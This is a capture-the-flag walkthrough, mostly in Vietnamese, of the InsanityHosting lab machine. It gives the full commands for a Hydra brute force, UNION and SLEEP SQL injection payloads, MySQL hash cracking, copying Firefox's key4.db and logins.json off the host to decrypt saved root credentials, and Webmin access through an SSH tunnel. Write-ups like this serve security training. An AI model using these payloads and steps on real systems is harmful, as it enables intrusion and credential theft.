# Proving Grounds Play — InsanityHosting | Full Walkthrough

> **Machine:** InsanityHosting
> **Difficulty:** Intermediate (Linux)
> **Author:** vodanhtieutot
> **Platform:** Offensive Security — Proving Grounds Play

---

## Table of Contents

1. [Overview](#1-overview)
2. [Reconnaissance — Nmap Scan](#2-reconnaissance--nmap-scan)
3. [Service Enumeration — FTP](#3-service-enumeration--ftp)
4. [Web Enumeration — Gobuster Root & Virtual Host Discovery](#4-web-enumeration--gobuster-root--virtual-host-discovery)
5. [Virtual Host Enumeration — www.insanityhosting.vm/news](#5-virtual-host-enumeration--wwwinsanityhostingvmnews)
6. [Credential Discovery — Hydra Brute Force monitoring/index.php](#6-credential-discovery--hydra-brute-force-monitoringindexphp)
7. [Lateral Movement — SquirrelMail & Monitoring Login](#7-lateral-movement--squirrelmail--monitoring-login)
8. [SQL Injection — Monitoring Add New Server](#8-sql-injection--monitoring-add-new-server)
9. [Hash Cracking & Initial Access — SSH as elliot](#9-hash-cracking--initial-access--ssh-as-elliot)
10. [Privilege Escalation — Firefox Credential Decryption → Webmin](#10-privilege-escalation--firefox-credential-decryption--webmin)
11. [Flags & Answers Summary](#11-flags--answers-summary)
12. [Attack Chain Summary](#12-attack-chain-summary)
13. [Tools Used](#13-tools-used)

---

## 1. Overview

**InsanityHosting** là một máy Linux trên Offensive Security Proving Grounds mô phỏng môi trường công ty hosting. Chuỗi tấn công bao gồm: phát hiện virtual host ẩn qua page source, brute-force portal monitoring nội bộ, khai thác **SQL Injection out-of-band** (kết quả trả về qua email SquirrelMail), crack MySQL hash, rồi leo quyền bằng cách giải mã **Firefox saved credentials** → truy cập **Webmin** port 10000 qua SSH tunnel.

```
Nmap → Port 21/22/80 (vsftpd 3.0.2, OpenSSH 7.4, Apache 2.4.6 CentOS PHP/7.2.33)
→ FTP anonymous: pub/ rỗng
→ Browse http://192.168.222.124 → "Hami." page → email hello@insanityhosting.vm
→ Gobuster root → /news, /webmail, /monitoring
→ Browse /news → Bludit blog, mention "Otis" → page source → www.insanityhosting.vm
→ /etc/hosts → gobuster www.insanityhosting.vm/news/ → /welcome, /admin, robots.txt
→ /welcome → "A special thank you to Otis" → username: otis
→ Burp intercept POST /monitoring/index.php → Hydra → otis:123456
→ Login monitoring → "Add New Server" → SQLi trong trường Name
→ SquirrelMail INBOX nhận WARNING email chứa output SQL
→ elliot:*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9 → hashcat -m 300 → elliot123
→ SSH elliot@192.168.222.124 → local.txt ✓
→ .mozilla/firefox/esmhp32w.default-default/ → key4.db + logins.json
→ SCP về máy → firefox_decrypt.py → root:S8Y389KJqWpJuSwFqFZHwfZ3GnegUa @ https://localhost:10000
→ ssh -L 10000:localhost:10000 elliot@192.168.222.124
→ Webmin login root → Command Shell → cat /root/proof.txt ✓
```

**Lab Environment:**

| Detail | Value |
|---|---|
| Target IP | `192.168.222.124` |
| Machine Name | `insanityhosting` |
| OS | CentOS Linux |
| Open Ports | 21 (vsftpd 3.0.2), 22 (OpenSSH 7.4), 80 (Apache/2.4.6 CentOS PHP/7.2.33) |
| Virtual Host | `www.insanityhosting.vm` / `insanityhosting.vm` |
| Attacker | Kali Linux (vodanhtieutot) |

---

## 2. Reconnaissance — Nmap Scan

### 2.1 Quick Port Scan

Full port scan với `--min-rate 5000` để tăng tốc:

```bash
nmap -Pn -p- --min-rate 5000 192.168.222.124
```

![Nmap quick scan — port 21, 22, 80 open](images/image1.png)

| Port | State | Service |
|---|---|---|
| 21/tcp | open | ftp |
| 22/tcp | open | ssh |
| 80/tcp | open | http |

### 2.2 Service & Script Scan

```bash
nmap -sC -sV -A -Pn -p 21,22,80 192.168.222.124
```

![Nmap service scan — vsftpd 3.0.2 anonymous allowed, OpenSSH 7.4, Apache 2.4.6 CentOS PHP/7.2.33, title "Insanity – UK and European Servers"](images/image2.png)

| Port | Service | Details |
|---|---|---|
| 21/tcp | FTP | vsftpd 3.0.2 — **ftp-anon: Anonymous FTP login allowed (FTP code 230)** |
| 22/tcp | SSH | OpenSSH 7.4 (protocol 2.0) |
| 80/tcp | HTTP | Apache httpd 2.4.6 (CentOS) PHP/7.2.33 |
| | | HTTP Title: **"Insanity – UK and European Servers"** |

> **Lưu ý:** Nmap xác nhận `ftp-anon: Anonymous FTP login allowed` — thử ngay FTP trước.

---

## 3. Service Enumeration — FTP

### 3.1 Anonymous FTP Login

```bash
ftp 192.168.222.124
# Name: anonymous
# Password: (để trống)
```

![FTP anonymous login thành công — cd pub → ls -la → thư mục rỗng, không có file nào](images/image3.png)

```
Connected to 192.168.222.124.
220 (vsFTPd 3.0.2)
Name: anonymous
230 Login successful.
ftp> ls -la
  drwxr-xr-x  2  0  0  6 Apr 01  2020 pub
ftp> cd pub
ftp> ls -la
  (empty)
```

> **Kết quả:** Anonymous FTP login thành công nhưng thư mục `pub/` hoàn toàn rỗng. FTP là dead end — chuyển sang web.

---

## 4. Web Enumeration — Gobuster Root & Virtual Host Discovery

### 4.1 Browsing Trang Chủ

Truy cập `http://192.168.222.124/`:

![Trang "Hami. — Free Server Monitoring", Call Us: 029 2018 0854, Email: hello@insanityhosting.vm](images/image4.png)

Trang web công ty hosting **"Hami."** với slogan "Free Server Monitoring". Phần contact hiển thị email `hello@insanityhosting.vm` — domain **`insanityhosting.vm`** lộ ra lần đầu.

### 4.2 Gobuster — Root Directory Scan

```bash
gobuster dir -u http://192.168.222.124 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt
```

![Gobuster root — index.php (200), index.html (200), /news (301), /webmail (301), /monitoring (301) phát hiện](images/image5.png)

| Path | Status | Notes |
|---|---|---|
| `index.php` | 200 | Trang chủ |
| `index.html` | 200 | Trang chủ |
| `/news` | **301** | Blog — render thiếu khi dùng IP |
| `/webmail` | **301** | Webmail service |
| `/monitoring` | **301** | Monitoring portal — mục tiêu chính |
| `/img`, `/data`, `/css`, `/js`, `/fonts` | 301 | Static assets |

### 4.3 Browse /news — Phát hiện Otis và Bludit

Truy cập `http://192.168.222.124/news`:

![/news — "Welcome to our corporate news blog!", đoạn Monitoring Service mention Otis, cuối trang Powered by Bludit](images/image6.png)

Trang blog công ty nội dung:

> *"Our team have been working hard to create you a free monitoring service for your servers. **A special thank you to Otis**, who led the team."*

Hai phát hiện quan trọng:
- Nhân viên tên **`Otis`** → username candidate
- *"Powered by **Bludit**"* → CMS đang dùng

### 4.4 Page Source — Phát hiện Virtual Host Ẩn

View page source của `/news`:

![Page source — link href: "http://www.insanityhosting.vm/news/bl-themes/...", link canonical: "http://www.insanityhosting.vm/news/"](images/image7.png)

```html
<link rel="icon" href="http://www.insanityhosting.vm/news/bl-themes/alternative/img/favicon.png">
<link rel="stylesheet" href="http://www.insanityhosting.vm/news/bl-kernel/css/bootstrap.min.css">
<link rel="canonical" href="http://www.insanityhosting.vm/news/">
```

> 🎯 **Critical finding:** Page source tiết lộ virtual host ẩn: **`www.insanityhosting.vm`**.

### 4.5 Thêm Virtual Host vào /etc/hosts

```bash
sudo nano /etc/hosts
```

![/etc/hosts trong nano — dòng "192.168.222.124  www.insanityhosting.vm  insanityhosting.vm" đã thêm](images/image8.png)

```
192.168.222.124    www.insanityhosting.vm    insanityhosting.vm
```

---

## 5. Virtual Host Enumeration — www.insanityhosting.vm/news

### 5.1 Gobuster trên Virtual Host

```bash
gobuster dir -u http://www.insanityhosting.vm/news/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x html,txt,php
```

![Gobuster www.insanityhosting.vm/news/ — welcome (200, 454k), admin (301), LICENSE (301), robots.txt (200), install.php (200)](images/image9.png)

| Path | Status | Notes |
|---|---|---|
| `/news/welcome` | **200** | Trang thông báo — chứa tên Otis |
| `/news/admin` | **301** | Bludit CMS admin panel |
| `/news/robots.txt` | 200 | Không có thông tin hữu ích |
| `/news/install.php` | 200 | Xác nhận Bludit đã cài |

### 5.2 Bludit Admin Login Panel

Truy cập `http://www.insanityhosting.vm/news/admin/`:

![BLUDIT CMS admin login page — URL: http://www.insanityhosting.vm/news/admin/](images/image10.png)

Trang admin **BLUDIT CMS** chuẩn với form Username / Password.

### 5.3 install.php

Truy cập `http://www.insanityhosting.vm/news/install.php`:

![install.php — "Bludit is already installed ;)"](images/image11.png)

```
Bludit is already installed ;)
```

### 5.4 robots.txt

Truy cập `http://www.insanityhosting.vm/news/robots.txt`:

![robots.txt — User-agent: * / Allow: /](images/image12.png)

```
User-agent: *
Allow: /
```

Không có path nào restricted — không có thông tin hữu ích.

### 5.5 /welcome — Username Otis Confirmed

Truy cập `http://www.insanityhosting.vm/news/welcome`:

![INSANITY HOSTING NEWS — "Monitoring Service", "A special thank you to Otis" (highlighted/selected)](images/image13.png)

> 🎯 **Username confirmed:** `otis` — người dẫn đầu team phát triển monitoring service.

### 5.6 Monitoring Login Portal

Truy cập `http://www.insanityhosting.vm/monitoring/login.php`:

![Monitoring portal — "Sign In" form với gradient background xanh-tím, URL: http://www.insanityhosting.vm/monitoring/login.php](images/image14.png)

Custom Sign In form tại URL `http://www.insanityhosting.vm/monitoring/login.php`. Giao diện tự code — brute-force candidate.

### 5.7 SquirrelMail Webmail

Truy cập `http://www.insanityhosting.vm/webmail/src/login.php`:

![SquirrelMail version 1.4.22 login — URL: http://www.insanityhosting.vm/webmail/src/login.php](images/image15.png)

**SquirrelMail version 1.4.22** — webmail client PHP. Sẽ dùng để nhận kết quả SQL injection qua email.

---

## 6. Credential Discovery — Hydra Brute Force monitoring/index.php

### 6.1 Burp Suite — Phân tích POST Request

Intercept request đăng nhập monitoring portal:

![Burp Suite — POST /monitoring/index.php, body: username=dsad&password=asdas, Response: 302 Found, Location: login.php](images/image16.png)

```http
POST /monitoring/index.php HTTP/1.1
Host: 192.168.222.124

username=dsad&password=asdas
```

Response khi sai: **`302 Found` → `Location: login.php`**

> **Thông tin brute-force:**
> - Endpoint: `POST /monitoring/index.php`
> - Failure condition: redirect về `login.php`

### 6.2 Hydra Brute Force

```bash
hydra -l otis -P /usr/share/wordlists/rockyou.txt \
  192.168.222.124 http-post-form \
  "/monitoring/index.php:username=^USER^&password=^PASS^:F=Location\: login.php"
```

![Hydra v9.6 — [80][http-post-form] host: 192.168.222.124, login: otis, password: 123456, 1 valid password found](images/image17.png)

```
[80][http-post-form] host: 192.168.222.124   login: otis   password: 123456
1 of 1 target successfully completed, 1 valid password found
```

> 🎯 **Credentials tìm thấy: `otis:123456`**

---

## 7. Lateral Movement — SquirrelMail & Monitoring Login

### 7.1 Đăng nhập Monitoring Dashboard

Dùng `otis:123456` đăng nhập vào `http://192.168.222.124/monitoring/index.php`:

![INSANITY HOSTING — MONITORING CONTROL dashboard, Server Status table: Localhost 127.0.0.1 UP, nút "Add New"](images/image18.png)

Dashboard hiển thị **Server Status**:

| Name | IP Address | Last Checked | Status |
|---|---|---|---|
| Localhost | 127.0.0.1 | 2026-04-01 18:25:01 | UP |

Nút **"Add New"** cho phép thêm server mới — trường **Name** là điểm inject SQL.

### 7.2 Credential Reuse — SquirrelMail

Thử `otis:123456` trên SquirrelMail:

![SquirrelMail INBOX — đăng nhập thành công với otis:123456, INBOX: "THIS FOLDER IS EMPTY"](images/image19.png)

> ✅ **Credential reuse thành công!** INBOX hiện rỗng — sẽ nhận email kết quả SQLi sau.

### 7.3 Thử Bludit Admin — Thất bại

Thử `otis:123456` tại `http://www.insanityhosting.vm/news/admin/`:

![BLUDIT admin — username field điền "otis", login thất bại, ở lại trang login](images/image20.png)

> ❌ BLUDIT admin không nhận credentials này — bỏ qua.

---

## 8. SQL Injection — Monitoring Add New Server

### 8.1 Inject Payload vào Trường Name

Thêm server mới với SQLi payload trong trường **Name**:

![Monitoring dashboard — hiển thị các entry SQLi: UNION SELECT table_name, UNION SELECT authentication_string từ mysql.user, SLEEP(10)](images/image21.png)

Các payload được thêm lần lượt:

```sql
-- Liệt kê tables:
a" UNION SELECT 1, GROUP_CONCAT(table_name), 3, 4 FROM information_schema.tables WHERE table_schema=database()-- -

-- Dump MySQL users & hashes:
a" UNION SELECT 1, GROUP_CONCAT(user, 0x3a, authentication_string), 3, 4 FROM mysql.user-- -

-- Dump app users table:
a" UNION SELECT 1, GROUP_CONCAT(username, 0x3a, password), 3, 4 FROM users-- -

-- Time-based blind test:
tuantuan" AND SLEEP(10)-- -
```

> **Cơ chế out-of-band:** App monitoring định kỳ ping các server, sau đó **gửi email report về SquirrelMail của Otis** — kết quả SQLi được nhúng trong email body.

### 8.2 Đọc Kết Quả qua SquirrelMail

**Email 1** — Xác nhận SQLi hoạt động (test tuantuan SLEEP):

![SquirrelMail INBOX (26 unread) — WARNING email từ monitor@localhost.localdomain, Subject: WARNING, body: "tuantuan is down", output dạng CSV: ID,Host,Date Time,Status](images/image22.png)

```
Subject: WARNING
From: monitor@localhost.localdomain
To: otis@localhost.localdomain

tuantuan is down. Please check the report below for more information.

ID, Host, Date Time, Status
74,tuantuan,"2026-04-01 18:29:01",1
...
```

**Email 2** — Kết quả UNION SELECT từ `mysql.user`:

![SquirrelMail — WARNING email, body: a" UNION SELECT ... FROM mysql.user-- - is down, output: 1,"root:,root:,...,elliot:*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9",3,4](images/image23.png)

```
ID, Host, Date Time, Status
1,"root:,root:,root:,root:,:,:,elliot:*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9",3,4
```

> 🎯 **MySQL hash của user `elliot` đã dump thành công:**
> ```
> *5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9
> ```
> Format MySQL native password hash — dùng `hashcat -m 300` để crack.

---

## 9. Hash Cracking & Initial Access — SSH as elliot

### 9.1 Crack MySQL Hash với Hashcat

```bash
echo '5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9' > hash.txt
hashcat -m 300 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 300 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --show
```

![hashcat -m 300 → --show output: 5a5749f309cac33b27ba94ee02168fa3c3e7a3e9:elliot123](images/image24.png)

```
5a5749f309cac33b27ba94ee02168fa3c3e7a3e9:elliot123
```

> 🎯 **Credentials: `elliot:elliot123`**

### 9.2 SSH Login & User Flag

```bash
ssh elliot@192.168.222.124
# Password: elliot123
```

![SSH elliot@192.168.222.124 — "elliot@192.168.222.124's password:", dir → local.txt, cat local.txt → a6b95e060e4e17f3415a21e66d05af90, [elliot@insanityhosting ~]$](images/image25.png)

```
[elliot@insanityhosting ~]$ dir
local.txt
[elliot@insanityhosting ~]$ cat local.txt
a6b95e060e4e17f3415a21e66d05af90
```

> 🚩 **local.txt (User Flag):** `a6b95e060e4e17f3415a21e66d05af90`

---

## 10. Privilege Escalation — Firefox Credential Decryption → Webmin

### 10.1 Enumeration — Phát hiện .mozilla Directory

```bash
[elliot@insanityhosting ~]$ ls -la
```

![ls -la — .bash_history → /dev/null, .mozilla (highlighted xanh), .ssh, local.txt](images/image26.png)

```
lrwxrwxrwx. 1 root   root     9 Aug 16  2020 .bash_history → /dev/null
drwx------. 5 elliot elliot  66 Aug 16  2020 .mozilla          ← !!!
drwx------. 2 elliot elliot  25 Aug 16  2020 .ssh
-rw-r--r--  1 elliot elliot  33 Apr  1 18:56 local.txt
```

> 🎯 **Phát hiện:** Thư mục `.mozilla` tồn tại — Firefox profile lưu password trong `key4.db` + `logins.json`.

### 10.2 Navigate vào Firefox Profile

```bash
[elliot@insanityhosting ~]$ cd .mozilla
[elliot@insanityhosting .mozilla]$ dir
extensions  firefox  systemextensionsdev
```

![.mozilla → dir → extensions firefox systemextensionsdev](images/image27.png)

```bash
[elliot@insanityhosting .mozilla]$ cd firefox
[elliot@insanityhosting firefox]$ ls -la
# → esmhp32w.default-default, wdqe31s0.default

[elliot@insanityhosting firefox]$ cd esmhp32w.default-default
[elliot@insanityhosting esmhp32w.default-default]$ ls -la | grep -E "logins.json|key"
```

![Firefox profile esmhp32w.default-default — ls -la | grep → key4.db (294912 bytes Aug 16 2020), logins.json (575 bytes Aug 16 2020)](images/image28.png)

```
-rw-------. 1 elliot elliot 294912 Aug 16  2020 key4.db
-rw-------. 1 elliot elliot    575 Aug 16  2020 logins.json
```

### 10.3 Exfiltration via SCP

Từ máy Kali, tải hai file về:

```bash
scp elliot@192.168.222.124:/home/elliot/.mozilla/firefox/esmhp32w.default-default/key4.db .
scp elliot@192.168.222.124:/home/elliot/.mozilla/firefox/esmhp32w.default-default/logins.json .
```

![SCP — key4.db 100% 288KB 862.7KB/s, logins.json 100% 575 5.9KB/s transfer thành công](images/image29.png)

```
key4.db       100%  288KB  862.7KB/s   00:00
logins.json   100%  575    5.9KB/s     00:00
```

### 10.4 Giải mã Firefox Credentials

Copy hai file vào `~/ff_full_profile/` rồi chạy `firefox_decrypt`:

```bash
python3 ~/firefox_decrypt/firefox_decrypt.py ~/ff_full_profile
```

![firefox_decrypt.py ~/ff_full_profile → Website: https://localhost:10000, Username: 'root', Password: 'S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'](images/image30.png)

```
Website:   https://localhost:10000
Username: 'root'
Password: 'S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'
```

> 🎯 **Root credentials từ Firefox saved passwords:**
> - **URL:** `https://localhost:10000` → Webmin admin panel (internal)
> - **Username:** `root`
> - **Password:** `S8Y389KJqWpJuSwFqFZHwfZ3GnegUa`

### 10.5 SSH Tunnel — Expose Webmin Port 10000

Webmin không expose ra ngoài. Tạo SSH local port forward:

```bash
ssh -L 10000:localhost:10000 elliot@192.168.222.124
```

![ssh -L 10000:localhost:10000 elliot@192.168.222.124 — tunnel thành công, [elliot@insanityhosting ~]$](images/image31.png)

```
elliot@192.168.222.124's password:
[elliot@insanityhosting ~]$
```

Tunnel active: `https://127.0.0.1:10000` trên Kali → Webmin trên target.

### 10.6 Webmin — Root Flag

Truy cập `https://127.0.0.1:10000`, đăng nhập `root:S8Y389KJqWpJuSwFqFZHwfZ3GnegUa`.

Vào **Others → Command Shell**:

```bash
cat /root/proof.txt
```

![Webmin Command Shell tại 127.0.0.1:10000/shell/index.cgi — "cat /root/proof.txt" → c5485941ed96e831032af8a2d52a7d32](images/image32.png)

```
> cat /root/proof.txt
c5485941ed96e831032af8a2d52a7d32
```

> 🚩 **proof.txt (Root Flag):** `c5485941ed96e831032af8a2d52a7d32`

---

## 11. Flags & Answers Summary

| Flag | Location | Value |
|---|---|---|
| User Flag | `/home/elliot/local.txt` | `a6b95e060e4e17f3415a21e66d05af90` |
| Root Flag | `/root/proof.txt` | `c5485941ed96e831032af8a2d52a7d32` |

---

## 12. Attack Chain Summary

```
[1] nmap -Pn -p- --min-rate 5000 192.168.222.124
        → Port 21 (ftp), 22 (ssh), 80 (http)

[2] nmap -sC -sV -A -Pn -p 21,22,80 192.168.222.124
        → vsftpd 3.0.2 (anonymous allowed)
        → OpenSSH 7.4
        → Apache 2.4.6 (CentOS) PHP/7.2.33
        → HTTP Title: "Insanity – UK and European Servers"

[3] ftp 192.168.222.124 (anonymous)
        → pub/ rỗng → dead end

[4] Browse http://192.168.222.124
        → "Hami." page → email hello@insanityhosting.vm → domain hint

[5] gobuster dir -u http://192.168.222.124 -w medium.txt -x php,html,txt
        → /news (301), /webmail (301), /monitoring (301)

[6] Browse http://192.168.222.124/news
        → Bludit CMS blog, "A special thank you to Otis" → username: otis

[7] View page source /news
        → href="http://www.insanityhosting.vm/news/..."
        → Virtual host: www.insanityhosting.vm

[8] /etc/hosts → 192.168.222.124  www.insanityhosting.vm  insanityhosting.vm

[9] gobuster dir -u http://www.insanityhosting.vm/news/ -w medium.txt -x html,txt,php
        → /welcome (200), /admin (301), robots.txt, install.php

[10] /news/admin → BLUDIT login
     /news/install.php → "Bludit is already installed ;)"
     /news/robots.txt → User-agent:*/Allow:/ (nothing)
     /news/welcome → "A special thank you to Otis" → username: otis confirmed
     /monitoring/login.php → custom Sign In form
     /webmail/src/login.php → SquirrelMail 1.4.22

[11] Burp Suite intercept POST /monitoring/index.php
        → body: username=...&password=...
        → Failure: 302 → Location: login.php

[12] hydra -l otis -P /usr/share/wordlists/rockyou.txt 192.168.222.124
     http-post-form "/monitoring/index.php:username=^USER^&password=^PASS^:F=Location\: login.php"
        → login: otis | password: 123456

[13] Login monitoring (otis:123456) → INSANITY HOSTING MONITORING CONTROL
        → Server Status: Localhost 127.0.0.1 UP, nút "Add New"
     Login SquirrelMail (otis:123456) → INBOX (rỗng, chờ nhận email)
     Login BLUDIT admin (otis:123456) → THẤT BẠI

[14] SQLi qua Add New Server (trường Name):
        a" UNION SELECT 1,GROUP_CONCAT(table_name),3,4
          FROM information_schema.tables WHERE table_schema=database()-- -
        a" UNION SELECT 1,GROUP_CONCAT(user,0x3a,authentication_string),3,4
          FROM mysql.user-- -
        a" UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3,4 FROM users-- -
        tuantuan" AND SLEEP(10)-- -

[15] SquirrelMail INBOX → WARNING email từ monitor@localhost.localdomain
        → mysql.user dump:
           elliot:*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9

[16] echo '5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9' > hash.txt
     hashcat -m 300 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --show
        → elliot123

[17] ssh elliot@192.168.222.124 (password: elliot123)
        → cat local.txt → a6b95e060e4e17f3415a21e66d05af90 ✓

[18] ls -la → .mozilla (highlighted)
     cd .mozilla/firefox/esmhp32w.default-default/
     ls -la | grep -E "logins.json|key"
        → key4.db (294912B), logins.json (575B)

[19] scp elliot@192.168.222.124:/home/elliot/.mozilla/firefox/esmhp32w.default-default/key4.db .
     scp elliot@192.168.222.124:/home/elliot/.mozilla/firefox/esmhp32w.default-default/logins.json .

[20] python3 ~/firefox_decrypt/firefox_decrypt.py ~/ff_full_profile
        → Website:  https://localhost:10000
        → Username: root
        → Password: S8Y389KJqWpJuSwFqFZHwfZ3GnegUa

[21] ssh -L 10000:localhost:10000 elliot@192.168.222.124

[22] Browse https://127.0.0.1:10000 → Webmin
     Login root:S8Y389KJqWpJuSwFqFZHwfZ3GnegUa
        → Others → Command Shell
        → cat /root/proof.txt → c5485941ed96e831032af8a2d52a7d32 ✓
```

---

## 13. Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scan (`-Pn -p- --min-rate`) & service fingerprint (`-sC -sV -A`) |
| `ftp` | Anonymous FTP login test |
| Firefox / Browser | Web browsing & page source analysis để tìm virtual host |
| `gobuster` | Directory brute-force (2 lượt: root IP với `-x php,html,txt`, virtual host `/news/` với `-x html,txt,php`) |
| Burp Suite | Intercept `POST /monitoring/index.php` — xác định parameters và failure condition |
| `hydra` | Brute-force `http-post-form` với failure string `F=Location\: login.php` |
| SquirrelMail | Nhận kết quả SQL injection out-of-band qua email WARNING |
| `/etc/hosts` | Map `www.insanityhosting.vm` → `192.168.222.124` |
| `ssh` | Remote shell (elliot) + local port forward `-L 10000:localhost:10000` |
| `scp` | Exfiltrate `key4.db` và `logins.json` từ Firefox profile directory |
| `hashcat` | Crack MySQL native hash (`-m 300`) → `elliot123` |
| `firefox_decrypt` | Giải mã Firefox saved passwords từ `key4.db` + `logins.json` |
| Webmin (port 10000) | Root access qua browser-based admin panel, Command Shell để đọc proof.txt |
